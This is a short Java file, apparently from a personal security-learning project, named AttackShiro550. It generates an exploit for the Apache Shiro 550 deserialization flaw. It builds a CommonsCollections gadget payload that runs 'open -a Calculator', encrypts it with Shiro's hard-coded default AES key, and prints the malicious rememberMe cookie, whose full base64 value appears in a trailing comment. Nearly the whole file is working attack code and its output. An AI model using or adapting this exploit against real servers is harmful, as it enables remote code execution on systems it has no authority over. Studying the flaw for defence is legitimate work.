import com.xjjlearning.hack.java.ysoserial.payloads.CommonCollectionsShiro;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;

import java.util.Base64;

/**
 * created by xjj on 2023/2/4
 */
public class AttackShiro550 {
    public static void main(String[] args) throws Exception {
        // CookieRememberMeManager
        byte[] payload = new CommonCollectionsShiro().getPayload("open -a Calculator");
        AesCipherService aes = new AesCipherService();
        // org.apache.shiro.web.mgt.CookieRememberMeManager.java为入口点分析
        byte[] key = Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
        ByteSource rememberMe = aes.encrypt(payload, key);
        System.out.println(rememberMe.toString());
        // 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
    }
}
